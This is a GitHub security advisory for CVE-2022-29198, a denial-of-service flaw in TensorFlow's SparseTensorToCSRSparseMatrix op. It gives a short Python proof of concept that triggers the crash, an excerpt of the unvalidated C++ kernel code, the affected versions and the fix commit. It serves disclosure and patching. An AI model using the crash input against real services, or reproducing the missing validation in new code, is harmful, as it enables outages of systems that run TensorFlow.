# [M] Missing validation causes denial of service via `SparseTensorToCSRSparseMatrix`

## Summary
Severity: Medium
Advisory: GHSA-mg66-qvc5-rm93
CVE: CVE-2022-29198
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-05-24
Source: https://github.com/advisories/GHSA-mg66-qvc5-rm93
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.6.4
- PyPI: `tensorflow` — affected >=2.7.0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.6.4
- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.6.4
- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1

## Details
### Impact
The implementation of [`tf.raw_ops.SparseTensorToCSRSparseMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse/sparse_tensor_to_csr_sparse_matrix_op.cc#L65-L119) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

indices = tf.constant(53, shape=[3], dtype=tf.int64)
values = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)
dense_shape = tf.constant(53, shape=[3], dtype=tf.int64)
    
tf.raw_ops.SparseTensorToCSRSparseMatrix(
  indices=indices,
  values=values,
  dense_shape=dense_shape)
```

The code assumes `dense_shape` is a vector and `indices` is a matrix (as part of requirements for sparse tensors) but there is no validation for this:
  
```cc
    const Tensor& indices = ctx->input(0);
    const Tensor& values = ctx->input(1);
    const Tensor& dense_shape = ctx->input(2);
    const int rank = dense_shape.NumElements();
    OP_REQUIRES(ctx, rank == 2 || rank == 3,
                errors::InvalidArgument("SparseTensor must have rank 2 or 3; ",
                                        "but indices has rank: ", rank));
    auto dense_shape_vec = dense_shape.vec<int64_t>();
    // ...
    OP_REQUIRES_OK(
        ctx,
        coo_to_csr(batch_size, num_rows, indices.template matrix<int64_t>(),
                   batch_ptr.vec<int32>(), csr_row_ptr.vec<int32>(),
                   csr_col_ind.vec<int32>()));
```

### Patches
We have patched the issue in GitHub commit [ea50a40e84f6bff15a0912728e35b657548cef11](https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mg66-qvc5-rm93
- https://nvd.nist.gov/vuln/detail/CVE-2022-29198
- https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse/sparse_tensor_to_csr_sparse_matrix_op.cc#L65-L119
- https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4
- https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2
- https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1
- https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0
